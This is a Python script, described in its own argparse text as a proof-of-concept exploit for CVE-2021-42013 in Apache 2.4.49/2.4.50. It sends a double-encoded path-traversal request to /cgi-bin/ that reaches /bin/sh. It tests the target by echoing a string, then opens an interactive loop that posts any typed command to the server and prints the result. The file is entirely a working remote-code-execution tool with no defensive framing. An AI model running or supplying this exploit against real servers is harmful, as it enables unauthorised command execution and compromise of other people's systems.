#!/bin/python3

import os
import requests
import urllib3
import argparse
from rich.console import Console
from rich.logging import RichHandler
import logging
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler()]
)

logger = logging.getLogger("vuln_checker")

current_time = datetime.now().strftime("%H:%M:%S")

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}

def exploit_vulnerability(url):
    vuln_path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
    full_url = url + vuln_path

    console.print(f"[[bold cyan]{current_time}[/bold cyan]] [[blue]INFO[/blue]] [red]~[/red] Checking if {url} is vulnerable")

    check_data = "echo Content-Type: text/plain; echo; echo test"
    try:
        check = requests.get(full_url, headers=headers, data=check_data, verify=False, timeout=7)
        check.raise_for_status()
        check_vuln = check.text
        if "test" in check_vuln:
            console.print(f"[[bold cyan]{current_time}[/bold cyan]] [[blue]INFO[/blue]] [red]~[/red] The target {url} is vulnerable")
            console.print(f"[[bold cyan]{current_time}[/bold cyan]] [[blue]INFO[/blue]] [red]~[/red] Initiating shell")
            os.system('sleep 2')
            console.print(f"[[bold cyan]{current_time}[/bold cyan]] [[blue]INFO[/blue]] [red]~[/red] Access Granted!")
            print("")
            while True:
                cmd = console.input("[red]k3ystr0k3r[/red][green]@[magenta]f4ck3d[/magenta][yellow]:~$[/yellow] ")
                if cmd.lower() == "exit":
                    break
                elif cmd.lower() == "clear":
                    os.system('clear')
                data = f"{cmd}"
                shell = requests.post(full_url, headers=headers, data=data, verify=False, timeout=7)
                logger.info(shell.text)
        else:
            logger.warning(f"The target {url} is not vulnerable")
    except requests.exceptions.RequestException as e:
        logger.error(f"An error occurred while checking vulnerability: {e}")

def main():
    parser = argparse.ArgumentParser(description='CVE-2021-42013 - Apache 2.4.49/2.4.50 Remote Code Execution (RCE) PoC Exploit')
    parser.add_argument('--url', required=True, help='Target URL')
    args = parser.parse_args()

    url = args.url
    exploit_vulnerability(url)

if __name__ == "__main__":
    main()
